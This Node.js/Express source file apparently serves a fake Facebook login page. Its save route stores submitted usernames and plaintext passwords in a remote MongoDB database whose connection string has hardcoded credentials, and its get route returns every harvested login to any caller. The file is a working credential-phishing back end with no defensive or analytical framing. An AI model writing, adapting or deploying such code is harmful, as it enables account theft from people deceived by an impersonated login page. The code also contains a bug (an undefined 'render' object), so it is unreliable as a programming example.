var express = require('express');
var mongoose = require('mongoose');
var bodyParser = require('body-parser')
var cors = require('cors');
var path = require('path');
var app = express();

app.use(cors());                    // Allow access control
app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
  extended: true
})); 

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.use(express.static(path.join(__dirname, 'public')));

//----------------------------------------------------------------------------------------------------------------

mongoose.connect('mongodb://saver:saver1234$@ds047732.mongolab.com:47732/pass_save_data');

var UserSchema = mongoose.Schema({
  username: String,
  password: String
});

var User = mongoose.model('User', UserSchema);

//----------------------------------------------------------------------------------------------------------------

app.get('/get_data', function(req, res) {
  User.find(function(err, users) {
    if (err) 
      console.log(err);
    else
      res.json(users);
  });
});

app.post('/save_data', function(req, res) {
  var user = new User({ username: req.body.username, password: req.body.password });
  user.save(function(err) {
    if (err) {
      console.log(err);
      render.json({ state: "error" });
    } else {
      console.log("Almacenada con éxito!");
    }
  });
  
  res.json({ state: "ok" });
});

app.get('/', function(req, res) {
  res.render('fb_login');
});

var theport = process.env.PORT || 5000;

var server = app.listen(theport);